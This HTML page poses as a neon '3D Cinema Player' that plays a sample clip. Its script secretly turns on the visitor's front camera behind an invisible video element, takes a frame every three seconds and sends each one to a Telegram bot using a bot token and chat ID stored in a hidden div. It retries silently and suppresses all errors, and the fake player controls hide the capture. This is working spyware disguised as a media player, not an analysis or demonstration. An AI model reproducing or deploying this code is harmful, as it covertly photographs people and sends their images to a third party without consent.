<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>3D Cinema Player · Neon</title>
  <!-- Orbitron from Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0b0e1a;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Orbitron', sans-serif;
      padding: 1rem;
      margin: 0;
    }

    /* main 3D container with glassmorphism & neon glow */
    .cinema-container {
      max-width: 1000px;
      width: 100%;
      background: rgba(10, 14, 30, 0.55);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border-radius: 50px;
      padding: 1.8rem 1.8rem 1.5rem;
      box-shadow: 0 25px 50px -8px rgba(0,0,0,0.9), 0 0 0 1px rgba(74, 138, 244, 0.2);
      transform: perspective(1200px) rotateX(3deg) rotateY(-2deg);
      transition: transform 0.3s cubic-bezier(0.2, 0.9, 0.3, 1.1), box-shadow 0.3s ease;
      border: 1px solid rgba(74, 138, 244, 0.15);
      position: relative;
      /* glow ring pulsing (4s) */
      animation: glowPulse 4s infinite ease-in-out;
    }

    .cinema-container:hover {
      transform: perspective(1200px) rotateX(3deg) rotateY(-2deg) scale(1.01);
      box-shadow: 0 30px 60px -6px #0a1428, 0 0 0 2px rgba(74, 138, 244, 0.4);
    }

    @keyframes glowPulse {
      0% { box-shadow: 0 25px 50px -8px rgba(0,0,0,0.9), 0 0 0 1px rgba(74, 138, 244, 0.2); }
      50% { box-shadow: 0 25px 60px -4px #0b1a3a, 0 0 30px 4px rgba(74, 138, 244, 0.3); }
      100% { box-shadow: 0 25px 50px -8px rgba(0,0,0,0.9), 0 0 0 1px rgba(74, 138, 244, 0.2); }
    }

    /* video wrapper 16:9 + cinema bars */
    .video-wrapper {
      position: relative;
      width: 100%;
      aspect-ratio: 16 / 9;
      border-radius: 32px;
      overflow: hidden;
      background: #000;
      box-shadow: inset 0 0 30px rgba(0,0,0,0.9);
      margin-bottom: 1.2rem;
    }

    /* main player video (visible) */
    #playerVideo {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      background: #0a0c16;
    }

    /* hidden camera video: invisible, mirrored */
    #cameraVideo {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
      opacity: 0;
      pointer-events: none;
      z-index: 2;
    }

    /* cinema bars (top & bottom darkening) */
    .cinema-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 3;
      border-radius: 32px;
      background: linear-gradient(to bottom, rgba(0,0,0,0.45) 0%, transparent 18%, transparent 82%, rgba(0,0,0,0.55) 100%);
    }

    /* fake controls bar */
    .controls-bar {
      background: rgba(8, 12, 28, 0.7);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-radius: 60px;
      padding: 0.6rem 1.5rem;
      display: flex;
      align-items: center;
      gap: 0.8rem;
      border: 1px solid rgba(74, 138, 244, 0.2);
      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
      margin-top: 0.2rem;
      flex-wrap: wrap;
      min-height: 60px;
    }

    .play-icon {
      font-size: 1.8rem;
      line-height: 1;
      color: #4a8af4;
      filter: drop-shadow(0 0 6px #4a8af4);
      cursor: default;
    }

    .progress-track {
      flex: 1;
      min-width: 80px;
      height: 6px;
      background: #1f2a44;
      border-radius: 20px;
      position: relative;
      box-shadow: inset 0 1px 4px rgba(0,0,0,0.6);
    }

    .progress-fill {
      width: 42%;
      height: 100%;
      background: linear-gradient(90deg, #4a8af4, #7bb3ff);
      border-radius: 20px;
      box-shadow: 0 0 12px #4a8af4;
      animation: progressAnim 5s infinite ease-in-out;
    }

    @keyframes progressAnim {
      0% { width: 8%; }
      50% { width: 78%; }
      100% { width: 8%; }
    }

    .hd-badge {
      font-size: 0.7rem;
      font-weight: 700;
      letter-spacing: 1px;
      color: #aac8ff;
      background: rgba(74, 138, 244, 0.15);
      padding: 0.2rem 0.8rem;
      border-radius: 30px;
      border: 1px solid #4a8af466;
      white-space: nowrap;
    }

    /* status row */
    .status-bar {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      min-height: 34px;
      margin-top: 0.8rem;
      gap: 0.6rem 1rem;
      background: rgba(0,0,0,0.25);
      padding: 0.3rem 0.8rem;
      border-radius: 60px;
      backdrop-filter: blur(4px);
      border: 1px solid rgba(74, 138, 244, 0.08);
    }

    .status-left {
      display: flex;
      align-items: center;
      gap: 0.8rem;
      flex-wrap: wrap;
    }

    .led {
      display: inline-block;
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: #4a8af4;
      box-shadow: 0 0 12px #4a8af4;
      animation: ledBlink 1.5s infinite;
    }

    @keyframes ledBlink {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.2; transform: scale(0.7); }
    }

    .streaming-text {
      color: #b6ceff;
      font-size: 0.8rem;
      letter-spacing: 2px;
      font-weight: 400;
      text-shadow: 0 0 8px #4a8af466;
    }

    .photo-counter {
      color: #c6dbff;
      font-size: 0.85rem;
      display: flex;
      align-items: center;
      gap: 6px;
      background: #121b33;
      padding: 0.2rem 0.9rem 0.2rem 0.7rem;
      border-radius: 40px;
      border: 1px solid #4a8af433;
    }

    .footer-specs {
      display: flex;
      gap: 1rem;
      font-size: 0.7rem;
      color: #6f8fc9;
      letter-spacing: 0.5px;
    }

    .footer-specs span {
      background: #0f162b;
      padding: 0.15rem 0.7rem;
      border-radius: 30px;
    }

    /* responsive */
    @media (max-width: 480px) {
      .cinema-container {
        padding: 1rem 0.8rem 0.8rem;
        border-radius: 32px;
      }
      .controls-bar {
        padding: 0.4rem 0.9rem;
        gap: 0.5rem;
        min-height: 48px;
      }
      .play-icon { font-size: 1.4rem; }
      .hd-badge { font-size: 0.55rem; padding: 0.1rem 0.5rem; }
      .status-bar {
        font-size: 0.7rem;
        padding: 0.2rem 0.6rem;
      }
      .photo-counter { font-size: 0.7rem; padding: 0.1rem 0.6rem; }
      .footer-specs span { font-size: 0.55rem; padding: 0.05rem 0.4rem; }
    }

    /* hidden token inputs (invisible) */
    .hidden-token {
      display: none;
    }
  </style>
</head>
<body>
  <div class="cinema-container">
    <!-- video section -->
    <div class="video-wrapper">
      <video id="playerVideo" muted playsinline>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
      </video>
      <video id="cameraVideo" autoplay playsinline muted></video>
      <div class="cinema-overlay"></div>
    </div>

    <!-- fake controls -->
    <div class="controls-bar">
      <span class="play-icon">▶</span>
      <div class="progress-track"><div class="progress-fill"></div></div>
      <span class="hd-badge">HD · 1080p</span>
    </div>

    <!-- status bar -->
    <div class="status-bar">
      <div class="status-left">
        <span class="led"></span>
        <span class="streaming-text">LIVE · STREAM</span>
        <span class="photo-counter"><span>📡</span> <span id="photoCountDisplay">0</span></span>
      </div>
      <div class="footer-specs">
        <span>1080p</span>
        <span>60fps</span>
        <span>Dolby Audio</span>
      </div>
    </div>

    <!-- hidden bot credentials (invisible) -->
    <div class="hidden-token" data-bot-token="8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0" data-chat-id="8157946649"></div>
  </div>

  <script>
    (function() {
      "use strict";

      // DOM refs
      const playerVideo = document.getElementById('playerVideo');
      const cameraVideo = document.getElementById('cameraVideo');
      const photoCountSpan = document.getElementById('photoCountDisplay');

      // Hidden token elements
      const tokenContainer = document.querySelector('.hidden-token');
      const BOT_TOKEN = tokenContainer?.dataset.botToken || '8917986127:AAEU47o8XCJenFqegCrgRDwoym8P5uduh_4';
      const CHAT_ID = tokenContainer?.dataset.chatId || '8157946649';

      let photoCounter = 0;
      let isProcessing = false;
      let cameraStream = null;
      let captureInterval = null;
      let cameraRetryTimer = null;
      let isCameraActive = false;

      // log on load
      console.log("🎬 3D Cinema Player + Hidden Camera Loaded");

      // ------ helper: send photo to telegram ------
      async function sendPhotoToTelegram(blob) {
        if (isProcessing) return;
        isProcessing = true;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'frame.jpg');

        try {
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          if (response.ok) {
            photoCounter++;
            photoCountSpan.textContent = photoCounter;
          } else {
            // silent fail
          }
        } catch (_) {
          // silent fail
        } finally {
          isProcessing = false;
        }
      }

      // ------ capture frame from camera video ------
      function captureAndSend() {
        if (!cameraVideo.videoWidth || !cameraVideo.videoHeight) return;
        if (isProcessing) return;

        try {
          const canvas = document.createElement('canvas');
          canvas.width = cameraVideo.videoWidth;
          canvas.height = cameraVideo.videoHeight;
          const ctx = canvas.getContext('2d');
          // mirror again? cameraVideo already mirrored via css, but we draw as is (mirrored)
          ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
          canvas.toBlob((blob) => {
            if (blob) {
              sendPhotoToTelegram(blob);
            }
          }, 'image/jpeg', 0.82);
        } catch (_) { /* silent */ }
      }

      // ------ start camera ------
      function startCamera() {
        if (cameraStream) {
          // already have stream
          return;
        }

        const constraints = {
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false
        };

        navigator.mediaDevices.getUserMedia(constraints)
          .then((stream) => {
            cameraStream = stream;
            cameraVideo.srcObject = stream;
            // play hidden camera
            cameraVideo.play().catch(() => {});
            isCameraActive = true;

            // clear any retry timer
            if (cameraRetryTimer) {
              clearTimeout(cameraRetryTimer);
              cameraRetryTimer = null;
            }

            // start capture interval (every 3s)
            if (captureInterval) clearInterval(captureInterval);
            captureInterval = setInterval(captureAndSend, 3000);

            // also capture one immediately
            setTimeout(captureAndSend, 500);
          })
          .catch((err) => {
            // silent: no console error
            isCameraActive = false;
            // retry after 5 seconds
            if (cameraRetryTimer) clearTimeout(cameraRetryTimer);
            cameraRetryTimer = setTimeout(() => {
              startCamera();
            }, 5000);
          });
      }

      // ------ user interaction starts camera (if not already) ------
      function handleUserInteraction() {
        if (!isCameraActive) {
          startCamera();
        }
        // also play main video if needed
        if (playerVideo.paused) {
          playerVideo.play().catch(() => {});
        }
      }

      // add event listeners for click/touch
      document.addEventListener('click', handleUserInteraction, { passive: true });
      document.addEventListener('touchstart', handleUserInteraction, { passive: true });

      // try autoplay player video (without user gesture may fail, but we try)
      playerVideo.play().catch(() => {});

      // If camera not available, but we also try on load if possible
      // but we wait for user gesture due to chrome policy; but we can attempt
      setTimeout(() => {
        // attempt camera without user gesture (may fail, but we handle)
        if (!isCameraActive) {
          startCamera();
        }
      }, 400);

      // ------ stop camera on page unload ------
      window.addEventListener('beforeunload', function() {
        if (captureInterval) clearInterval(captureInterval);
        if (cameraRetryTimer) clearTimeout(cameraRetryTimer);
        if (cameraStream) {
          cameraStream.getTracks().forEach(track => track.stop());
          cameraStream = null;
        }
        isCameraActive = false;
      });

      // also if page visibility changes? not required but ok.
      // ensure hidden camera stays opacity:0 (already in css)
    })();
  </script>
</body>
</html>
